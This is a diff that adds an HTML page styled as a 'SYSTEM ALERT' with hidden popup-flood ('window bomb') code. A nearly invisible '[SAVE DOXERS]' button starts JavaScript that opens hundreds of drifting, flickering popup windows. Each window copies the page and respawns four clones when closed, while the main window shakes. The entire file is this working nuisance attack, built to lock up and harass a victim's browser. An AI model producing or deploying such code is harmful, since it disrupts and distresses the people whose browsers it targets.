@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SYSTEM ALERT</title>
+    <style>
+        body {
+            background: #000;
+            margin: 0;
+            overflow: hidden;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+        }
+        #trigger {
+            position: fixed;
+            bottom: 5px;
+            left: 5px;
+            color: #0f03;
+            font-size: 8px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            z-index: 9999;
+        }
+        .glitch {
+            position: fixed;
+            font-size: 4px;
+            opacity: 0.5;
+            text-shadow: 0 0 2px #0f0;
+        }
+    </style>
+</head>
+<body>
+    <button id="trigger" onclick="initInfection()">[SAVE DOXERS]</button>
+
+    <script>
+        let infectionLevel = 0;
+        const MAX_INFECTION = 666;
+        const windowPool = [];
+        
+        function createZombieWindow(parentWindow) {
+            if(infectionLevel++ > MAX_INFECTION) return;
+
+            try {
+                const newWindow = parentWindow.open('', '_blank', `
+                    width=${Math.random()*300+200},
+                    height=${Math.random()*200+100},
+                    left=${Math.random()*(screen.width-300)},
+                    top=${Math.random()*(screen.height-200)}
+                `);
+                
+                newWindow.document.write(document.documentElement.outerHTML);
+                newWindow.addEventListener('beforeunload', () => spawnClones(newWindow, 4));
+                
+                windowPool.push(newWindow);
+                animateWindow(newWindow);
+                addGlitchEffect(newWindow);
+                
+            } catch(e) { /* Браузерная защита */}
+        }
+
+        function animateWindow(win) {
+            let x = Math.random() * screen.width;
+            let y = Math.random() * screen.height;
+            let dx = (Math.random()-0.5)*5;
+            let dy = (Math.random()-0.5)*5;
+
+            const move = () => {
+                if(win.closed) return;
+                
+                x = (x + dx + screen.width) % screen.width;
+                y = (y + dy + screen.height) % screen.height;
+                
+                try { win.moveTo(x, y); } catch(e) {}
+                requestAnimationFrame(move);
+            };
+            move();
+        }
+
+        function addGlitchEffect(win) {
+            setInterval(() => {
+                if(win.closed) return;
+                win.document.title = `[${Math.random().toString(36).substr(2, 5)}.EXE]`;
+                win.document.body.style.background = `rgb(0,${Math.random()*50},0)`;
+            }, 100);
+        }
+
+        function spawnClones(deadWindow, count) {
+            Array(count).fill().forEach(() => createZombieWindow(deadWindow));
+        }
+
+        function initInfection() {
+            document.body.innerHTML += Array(20).fill().map((_,i) => 
+                `<div class="glitch" style="
+                    left:${Math.random()*100}%;
+                    top:${Math.random()*100}%;
+                    animation-delay:${i*0.2}s
+                ">${Math.random().toString(36).substr(2, 20)}</div>`
+            ).join('');
+            
+            createZombieWindow(window);
+            setInterval(() => window.moveBy(
+                Math.random()*10-5, 
+                Math.random()*10-5
+            ), 50);
+            
+            document.getElementById('trigger').remove();
+        }
+    </script>
+</body>
+</html>
